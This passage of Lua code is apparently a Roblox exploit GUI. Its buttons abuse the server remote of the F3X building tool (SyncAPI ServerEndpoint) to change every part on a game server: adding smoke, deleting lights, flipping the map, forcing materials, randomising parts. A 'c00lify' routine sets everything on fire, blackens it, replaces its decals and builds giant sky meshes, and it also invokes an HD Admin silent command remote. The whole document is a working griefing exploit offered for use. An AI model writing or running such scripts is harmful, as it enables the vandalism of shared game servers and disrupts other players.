		table.insert(smokeSyncBatch, {
			["Part"] = part, 
			["DecorationType"] = "Smoke", 
			["Size"] = 100, 
			["RiseVelocity"] = 25, 
			["Opacity"] = 1, 
			["Color"] = Color3.new(0, 1, 0)
		})
	end

	if #targets > 0 then
		_({"CreateDecorations", smokeCreateBatch})
		_({"SyncDecorate", smokeSyncBatch})
	end
end

RedSmokeAllParts()

end)
end

local TextButton10 = Instance.new("TextButton")
TextButton10.Name = "TextButton"
TextButton10.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton10.Text = " smoke blue"
TextButton10.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton10.TextSize = 14
TextButton10.TextWrapped = true
TextButton10.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton10.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton10.BorderSizePixel = 2
TextButton10.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton10.Size = UDim2.new(0, 74, 0, 31)
TextButton10.Parent = R[226]

local LocalScript11 = Instance.new("Folder")
LocalScript11.Name = "LocalScript"
LocalScript11.Parent = TextButton10
__S[#__S + 1] = function(...)
local script = LocalScript11
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
	remote:InvokeServer(unpack(args))
end

local function RedSmokeAllParts()
	local targets = {}
	local smokeCreateBatch = {}
	local smokeSyncBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Name ~= "Terrain" and not v:IsDescendantOf(char) then
			table.insert(targets, v)
		end
	end

	for _, part in ipairs(targets) do
		table.insert(smokeCreateBatch, {
			["Part"] = part, 
			["DecorationType"] = "Smoke"
		})
		table.insert(smokeSyncBatch, {
			["Part"] = part, 
			["DecorationType"] = "Smoke", 
			["Size"] = 100, 
			["RiseVelocity"] = 25, 
			["Opacity"] = 1, 
			["Color"] = Color3.new(0, 0, 1)
		})
	end

	if #targets > 0 then
		_({"CreateDecorations", smokeCreateBatch})
		_({"SyncDecorate", smokeSyncBatch})
	end
end

RedSmokeAllParts()

end)
end

local TextButton11 = Instance.new("TextButton")
TextButton11.Name = "TextButton"
TextButton11.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton11.Text = "remove lights and smoke"
TextButton11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton11.TextSize = 14
TextButton11.TextWrapped = true
TextButton11.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton11.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton11.BorderSizePixel = 2
TextButton11.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton11.Size = UDim2.new(0, 74, 0, 31)
TextButton11.Parent = R[226]

local LocalScript12 = Instance.new("Folder")
LocalScript12.Name = "LocalScript"
LocalScript12.Parent = TextButton11
__S[#__S + 1] = function(...)
local script = LocalScript12
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
	remote:InvokeServer(unpack(args))
end

local function ClearAllDecorationsAndLights()
	local itemsToDelete = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if not v:IsDescendantOf(char) then
			if v:IsA("Smoke") or v:IsA("Fire") or v:IsA("Sparkles") or v:IsA("Light") then
				table.insert(itemsToDelete, v)
			end
		end
	end

	local chunkSize = 400
	for i = 1, #itemsToDelete, chunkSize do
		local batch = {}
		for j = i, math.min(i + chunkSize - 1, #itemsToDelete) do
			table.insert(batch, itemsToDelete[j])
		end
		
		task.spawn(function()
			remote:InvokeServer("Remove", batch)
		end)
	end
end

ClearAllDecorationsAndLights()

end)
end

local TextButton12 = Instance.new("TextButton")
TextButton12.Name = "TextButton"
TextButton12.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton12.Text = "reset part rotation"
TextButton12.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton12.TextSize = 14
TextButton12.TextWrapped = true
TextButton12.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton12.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton12.BorderSizePixel = 2
TextButton12.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton12.Size = UDim2.new(0, 74, 0, 31)
TextButton12.Parent = R[226]

local LocalScript13 = Instance.new("Folder")
LocalScript13.Name = "LocalScript"
LocalScript13.Parent = TextButton12
__S[#__S + 1] = function(...)
local script = LocalScript13
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
	remote:InvokeServer(unpack(args))
end

local function ResetAllRotations()
	local targets = {}
	local moveBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Name ~= "Terrain" and not v:IsDescendantOf(char) then
			table.insert(targets, v)
		end
	end

	for _, part in ipairs(targets) do
		local currentPosition = part.Position
		local flatCFrame = CFrame.new(currentPosition)

		table.insert(moveBatch, {
			["Part"] = part,
			["CFrame"] = flatCFrame
		})
	end

	local chunkSize = 300
	for i = 1, #moveBatch, chunkSize do
		local batch = {}
		for j = i, math.min(i + chunkSize - 1, #moveBatch) do
			table.insert(batch, moveBatch[j])
		end
		
		task.spawn(function()
			_({"SyncMove", batch})
		end)
	end
end

ResetAllRotations()

end)
end

local TextButton13 = Instance.new("TextButton")
TextButton13.Name = "TextButton"
TextButton13.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton13.Text = "flip everything"
TextButton13.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton13.TextSize = 14
TextButton13.TextWrapped = true
TextButton13.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton13.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton13.BorderSizePixel = 2
TextButton13.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton13.Size = UDim2.new(0, 74, 0, 31)
TextButton13.Parent = R[226]

local LocalScript14 = Instance.new("Folder")
LocalScript14.Name = "LocalScript"
LocalScript14.Parent = TextButton13
__S[#__S + 1] = function(...)
local script = LocalScript14
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
	remote:InvokeServer(unpack(args))
end

local function FlipEntireMapUpsideDown()
	local targets = {}
	local moveBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "Sky" and v.Name ~= "Skybox" and not v:IsDescendantOf(char) then
			table.insert(targets, v)
		end
	end

	if #targets == 0 then return end

	local minX, minY, minZ = math.huge, math.huge, math.huge
	local maxX, maxY, maxZ = -math.huge, -math.huge, -math.huge

	for _, part in ipairs(targets) do
		local pos = part.Position
		if pos.X < minX then minX = pos.X end
		if pos.Y < minY then minY = pos.Y end
		if pos.Z < minZ then minZ = pos.Z end
		if pos.X > maxX then maxX = pos.X end
		if pos.Y > maxY then maxY = pos.Y end
		if pos.Z > maxZ then maxZ = pos.Z end
	end

	local centerPosition = Vector3.new((minX + maxX) / 2, (minY + maxY) / 2, (minZ + maxZ) / 2)
	local pivotCFrame = CFrame.new(centerPosition)
	local flipTransformation = CFrame.Angles(0, 0, math.rad(180))

	for _, part in ipairs(targets) do
		local relativeCFrame = pivotCFrame:ToObjectSpace(part.CFrame)
		local rotatedRelativeCFrame = flipTransformation * relativeCFrame
		local targetCFrame = pivotCFrame:ToWorldSpace(rotatedRelativeCFrame)

		table.insert(moveBatch, {
			["Part"] = part,
			["CFrame"] = targetCFrame
		})
	end

	local chunkSize = 300
	for i = 1, #moveBatch, chunkSize do
		local batch = {}
		for j = i, math.min(i + chunkSize - 1, #moveBatch) do
			table.insert(batch, moveBatch[j])
		end
		
		task.spawn(function()
			_({"SyncMove", batch})
		end)
	end
end

FlipEntireMapUpsideDown()

end)
end

local TextButton14 = Instance.new("TextButton")
TextButton14.Name = "TextButton"
TextButton14.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton14.Text = "grass material all"
TextButton14.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton14.TextSize = 14
TextButton14.TextWrapped = true
TextButton14.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton14.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton14.BorderSizePixel = 2
TextButton14.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton14.Size = UDim2.new(0, 74, 0, 31)
TextButton14.Parent = R[226]

local LocalScript15 = Instance.new("Folder")
LocalScript15.Name = "LocalScript"
LocalScript15.Parent = TextButton14
__S[#__S + 1] = function(...)
local script = LocalScript15
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then
			return v.Parent
		end
	end
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then
			return v.Parent
		end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint

local function ConvertMaterialsToGrass()
	local targets = {}
	local materialBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "Sky" and v.Name ~= "Skybox" and not v:IsDescendantOf(char) then
			table.insert(targets, v)
		end
	end

	if #targets == 0 then return end

	for _, part in ipairs(targets) do
		table.insert(materialBatch, {
			["Part"] = part,
			["Material"] = Enum.Material.Grass,
			["Transparency"] = part.Transparency,
			["Reflectance"] = part.Reflectance
		})
	end

	local chunkSize = 300
	for i = 1, #materialBatch, chunkSize do
		local batch = {}
		for j = i, math.min(i + chunkSize - 1, #materialBatch) do
			table.insert(batch, materialBatch[j])
		end
		
		task.spawn(function()
			remote:InvokeServer("SyncMaterial", batch)
		end)
	end
end

ConvertMaterialsToGrass()

end)
end

local TextButton15 = Instance.new("TextButton")
TextButton15.Name = "TextButton"
TextButton15.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton15.Text = "sandstone material all"
TextButton15.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton15.TextSize = 14
TextButton15.TextWrapped = true
TextButton15.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton15.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton15.BorderSizePixel = 2
TextButton15.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton15.Size = UDim2.new(0, 74, 0, 31)
TextButton15.Parent = R[226]

local LocalScript16 = Instance.new("Folder")
LocalScript16.Name = "LocalScript"
LocalScript16.Parent = TextButton15
__S[#__S + 1] = function(...)
local script = LocalScript16
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then
			return v.Parent
		end
	end
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then
			return v.Parent
		end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint

local function ConvertMaterialsToGrass()
	local targets = {}
	local materialBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "Sky" and v.Name ~= "Skybox" and not v:IsDescendantOf(char) then
			table.insert(targets, v)
		end
	end

	if #targets == 0 then return end

	for _, part in ipairs(targets) do
		table.insert(materialBatch, {
			["Part"] = part,
			["Material"] = Enum.Material.Sandstone,
			["Transparency"] = part.Transparency,
			["Reflectance"] = part.Reflectance
		})
	end

	local chunkSize = 300
	for i = 1, #materialBatch, chunkSize do
		local batch = {}
		for j = i, math.min(i + chunkSize - 1, #materialBatch) do
			table.insert(batch, materialBatch[j])
		end
		
		task.spawn(function()
			remote:InvokeServer("SyncMaterial", batch)
		end)
	end
end

ConvertMaterialsToGrass()

end)
end

local TextButton16 = Instance.new("TextButton")
TextButton16.Name = "TextButton"
TextButton16.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton16.Text = "neon material all"
TextButton16.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton16.TextSize = 14
TextButton16.TextWrapped = true
TextButton16.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton16.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton16.BorderSizePixel = 2
TextButton16.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton16.Size = UDim2.new(0, 74, 0, 31)
TextButton16.Parent = R[226]

local LocalScript17 = Instance.new("Folder")
LocalScript17.Name = "LocalScript"
LocalScript17.Parent = TextButton16
__S[#__S + 1] = function(...)
local script = LocalScript17
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then
			return v.Parent
		end
	end
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then
			return v.Parent
		end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint

local function ConvertMaterialsToGrass()
	local targets = {}
	local materialBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "Sky" and v.Name ~= "Skybox" and not v:IsDescendantOf(char) then
			table.insert(targets, v)
		end
	end

	if #targets == 0 then return end

	for _, part in ipairs(targets) do
		table.insert(materialBatch, {
			["Part"] = part,
			["Material"] = Enum.Material.Neon,
			["Transparency"] = part.Transparency,
			["Reflectance"] = part.Reflectance
		})
	end

	local chunkSize = 300
	for i = 1, #materialBatch, chunkSize do
		local batch = {}
		for j = i, math.min(i + chunkSize - 1, #materialBatch) do
			table.insert(batch, materialBatch[j])
		end
		
		task.spawn(function()
			remote:InvokeServer("SyncMaterial", batch)
		end)
	end
end

ConvertMaterialsToGrass()

end)
end

local TextButton17 = Instance.new("TextButton")
TextButton17.Name = "TextButton"
TextButton17.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton17.Text = "c00lify"
TextButton17.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton17.TextSize = 14
TextButton17.TextWrapped = true
TextButton17.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton17.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton17.BorderSizePixel = 2
TextButton17.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton17.Size = UDim2.new(0, 74, 0, 31)
TextButton17.Parent = R[226]

local LocalScript18 = Instance.new("Folder")
LocalScript18.Name = "LocalScript"
LocalScript18.Parent = TextButton17
__S[#__S + 1] = function(...)
local script = LocalScript18
script.Parent.MouseButton1Click:Connect(function()
local id = "158118263"

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do
	if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
		tool = v.Parent
	end
end

if tool == nil then
	for i, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
end

local remote = tool.SyncAPI.ServerEndpoint

local function _(args)
	return remote:InvokeServer(unpack(args))
end

function SetLocked(part, boolean)
	_({"SetLocked", {part}, boolean})
end

function AddFire(part)
	_({"CreateDecorations", {{["Part"] = part, ["DecorationType"] = "Fire"}}})
end

function SpawnDecal(part, side)
	_({"CreateTextures", {{["Part"] = part, ["Face"] = side, ["TextureType"] = "Decal"}}})
end

function AddDecal(part, asset, side)
	_({"SyncTexture", {{["Part"] = part, ["Face"] = side, ["TextureType"] = "Decal", ["Texture"] = "rbxassetid://" .. asset}}})
end

function ClonePart(tbl, parent)
	_({"Clone", tbl, parent})
end

function removetable(t)
	local args = { [1] = "Remove", [2] = {} }
	for _, v in pairs(t) do
		if v ~= nil and v:IsA("Decal") then
			table.insert(args[2], v)
		end
	end
	if #args[2] > 0 then
		_(args)
	end
end

local partsToModify = {}
local preExistingDecals = {}

for _, v in pairs(workspace:GetDescendants()) do
	if v:IsA("BasePart") and v.Name ~= "Terrain" and not string.find(v.Name, "Sky") then
		table.insert(partsToModify, v)
	elseif v:IsA("Decal") then
		table.insert(preExistingDecals, v)
	end
end

task.spawn(function()
	if #preExistingDecals > 0 then
		removetable(preExistingDecals)
	end
end)

task.spawn(function()
	local colorBatch = {}
	for _, part in pairs(partsToModify) do
		table.insert(colorBatch, {["Part"] = part, ["Color"] = Color3.new(0, 0, 0), ["UnionColoring"] = false})
	end
	if #colorBatch > 0 then
		_({"SyncColor", colorBatch})
	end
end)

task.spawn(function()
	for _, part in pairs(partsToModify) do
		task.spawn(function()
			SetLocked(part, false)
			AddFire(part)
		end)
	end
end)

local testpart = remote:InvokeServer("CreatePart", "Normal", CFrame.new(102938, 182939, 2928458), workspace.Terrain)
local root = testpart

local faces = {
	Enum.NormalId.Front,
	Enum.NormalId.Back,
	Enum.NormalId.Left,
	Enum.NormalId.Right,
	Enum.NormalId.Top,
	Enum.NormalId.Bottom
}

for _, face in pairs(faces) do
	task.defer(function() SpawnDecal(root, face) end)
	task.defer(function() AddDecal(root, id, face) end)
end

repeat task.wait() until root:FindFirstChildOfClass("Decal")

local masterDecals = {}
for _, v in root:GetDescendants() do
	if v:IsA("Decal") then 
		table.insert(masterDecals, v)
	end
end

for _, part in pairs(partsToModify) do
	if part ~= root then
		task.defer(function()
			task.spawn(ClonePart, masterDecals, part)
		end)
	end
end

task.delay(5, function()
	_({"Remove", {root}})
end)
	wait(0)
	local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local SMALL_ID = "158118263"
local ZERO = Vector3.new(0, 0, 0)
local SKY_MESH = "111891702759441"
local SKY_SCALES = { [99999] = true, [10000] = true, [11000] = true, [110000] = true }

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local f3x = getf3x()
if not f3x then
	warn("no f3x broo")
	return
end

local function getMeshScale(part)
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	if mesh then
		return mesh.Scale
	end
	return Vector3.new(0, 0, 0)
end

local function getVertexColor(part)
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	if mesh then
		return mesh.VertexColor
	end
	return Vector3.new(1, 1, 1)
end

local function isSky(part)
	if not part:IsA("BasePart") then
		return false
	end
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	return mesh ~= nil and mesh.MeshId:match("%d+") == SKY_MESH
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

RequestCommand:InvokeServer(";time 0 ;fogcolor black")

local tool
for i, v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for i, v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end

local remote = tool.SyncAPI.ServerEndpoint
function _(args)
	remote:InvokeServer(unpack(args))
end

function SetMesh(part, meshid, vertexColor)
	_({ "SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. meshid, VertexColor = vertexColor or Vector3.new(1, 1, 1) } } })
end

function CreatePart(cf, parent)
	_({ "CreatePart", "Normal", cf, parent })
end

function AddMesh(part)
	_({ "CreateMeshes", { { Part = part } } })
end

function SetTexture(part, texid)
	_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid } } })
end

function SetName(part, stringg)
	_({ "SetName", { part }, stringg })
end

function MeshResize(part, size)
	_({ "SyncMesh", { { Part = part, Scale = size } } })
end

function SetLocked(part, boolean)
	_({ "SetLocked", { part }, boolean })
end

function SetTrans(part, int)
	_({ "SyncMaterial", { { Part = part, Transparency = int } } })
end

function Color(part, color)
	_({ "SyncColor", { { Part = part, Color = color, UnionColoring = false } } })
end

function SyncLighting(part, brightness)
	_({ "SyncLighting", { { Part = part, LightType = "PointLight", Brightness = brightness } } })
end

function UpdateMeshTextureAndColor(part, texid, vertexColor)
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	local finalColor = vertexColor or (mesh and mesh.VertexColor) or Vector3.new(1, 1, 1)
	_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid, VertexColor = finalColor } } })
end

local function waitForPartAt(x, z, timeout)
	local start = os.clock()
	repeat
		for _, v in ipairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and not isSky(v) and v.CFrame.X == x and v.CFrame.Z == z then
				return v
			end
		end
		RunService.Heartbeat:Wait()
	until os.clock() - start > (timeout or 2)
	return nil
end

local function findExisting()
	local big, small
	for _, v in ipairs(workspace:GetDescendants()) do
		if isSky(v) then
			if getVertexColor(v) == ZERO then
				big = big or v
			elseif SKY_SCALES[math.round(getMeshScale(v).X)] then
				small = small or v
			end
		end
	end
	return big, small
end

local function setupSky(v, spec)
	SetName(v, "Sky")
	AddMesh(v)

	SetMesh(v, SKY_MESH, spec.vertexColor)
	SetTexture(v, spec.id)
	MeshResize(v, Vector3.new(spec.scale, spec.scale, spec.scale))

	SetLocked(v, true)
	SetTrans(v, spec.transparency)

	_({ "SyncMaterial", { { Part = v, Material = Enum.Material.Neon } } })

	Color(v, Color3.fromRGB(255, 255, 255))

	_({ "CreateLights", { { Part = v, LightType = "PointLight" } } })

	SyncLighting(v, 0)
end

function UpdateSkies()
	for i, v in game.Workspace:GetDescendants() do
		if isSky(v) then
			local specialMesh = v:FindFirstChildOfClass("SpecialMesh")
			if specialMesh then
				local vColor = specialMesh.VertexColor
				if vColor == ZERO then
					continue
				end

				local currentScale = specialMesh.Scale
				local currentTexture = specialMesh.TextureId:match("%d+") or ""
				local currentMeshId = specialMesh.MeshId:match("%d+") or SKY_MESH

				local targetVertexColor
				local targetTransparency

				if currentScale.X >= 105000 then
					targetVertexColor = ZERO
					targetTransparency = 0
				elseif currentScale.X >= 90000 and currentScale.X <= 100000 then
					targetVertexColor = Vector3.new(3.3, 3.3, 3.3)
					targetTransparency = 0.02
				else
					targetVertexColor = vColor
					targetTransparency = v.Transparency
				end

				if currentTexture ~= "" then
					UpdateMeshTextureAndColor(v, currentTexture, targetVertexColor)
				else
					SetMesh(v, currentMeshId, targetVertexColor)
				end

				SetLocked(v, true)
				SetTrans(v, targetTransparency)

				_({ "SyncMaterial", { { Part = v, Material = Enum.Material.Neon } } })

				Color(v, Color3.fromRGB(255, 255, 255))
				SyncLighting(v, 0)
			end
		end
	end
end

local big, small = findExisting()

if not small then
	UpdateSkies()
	big, small = findExisting()
end

if small then
	UpdateMeshTextureAndColor(small, SMALL_ID, nil)
end

local specs = {}
if not big then
	table.insert(specs, { id = "dont change this", transparency = 0, scale = 110000, vertexColor = ZERO, offset = Vector3.new(-25, -10, 0) })
end
if not small then
	table.insert(specs, { id = SMALL_ID, transparency = 0.02, scale = 99999, vertexColor = Vector3.new(4, 4, 4), offset = Vector3.new(25, -10, 0) })
end

if #specs > 0 then
	local hrp = char.HumanoidRootPart.CFrame
	local basePos = Vector3.new(math.floor(hrp.X), math.floor(hrp.Y), math.floor(hrp.Z))

	for _, spec in ipairs(specs) do
		spec.pos = basePos + spec.offset
		task.spawn(CreatePart, CFrame.new(spec.pos) + Vector3.new(0, -10, 0), workspace)
	end

	for _, spec in ipairs(specs) do
		task.spawn(function()
			local part = waitForPartAt(spec.pos.X, spec.pos.Z)
			if part then
				setupSky(part, spec)
			end
		end)
	end
end

end)
end

local TextButton18 = Instance.new("TextButton")
TextButton18.Name = "TextButton"
TextButton18.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton18.Text = "randomify all parts"
TextButton18.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton18.TextSize = 14
TextButton18.TextWrapped = true
TextButton18.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton18.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton18.BorderSizePixel = 2
TextButton18.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton18.Size = UDim2.new(0, 74, 0, 31)
TextButton18.Parent = R[226]

local LocalScript19 = Instance.new("Folder")
LocalScript19.Name = "LocalScript"
LocalScript19.Parent = TextButton18
__S[#__S + 1] = function(...)
local script = LocalScript19
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do
	if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
		tool = v.Parent
	end
end

if tool == nil then
	for i, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
end

for i, v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end

local remote = tool.SyncAPI.ServerEndpoint

local function _(args)
	return remote:InvokeServer(unpack(args))
end

local materials = Enum.Material:GetEnumItems()

local function RandomizeWorkspace()
	local colorBatch = {}
	local materialBatch = {}

	for _, v in pairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Name ~= "Terrain" and not string.find(v.Name, "Sky") then
			local randomColor = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
			table.insert(colorBatch, {["Part"] = v, ["Color"] = randomColor, ["UnionColoring"] = false})

			local randomMaterial = materials[math.random(1, #materials)]
			local randomTransparency = math.random()
			local randomReflectance = math.random()
			
			table.insert(materialBatch, {
				["Part"] = v, 
				["Material"] = randomMaterial, 
				["Transparency"] = randomTransparency,
				["Reflectance"] = randomReflectance
			})
		end
	end

	if #colorBatch > 0 then
		_({"SyncColor", colorBatch})
	end
	if #materialBatch > 0 then
		_({"SyncMaterial", materialBatch})
	end
end

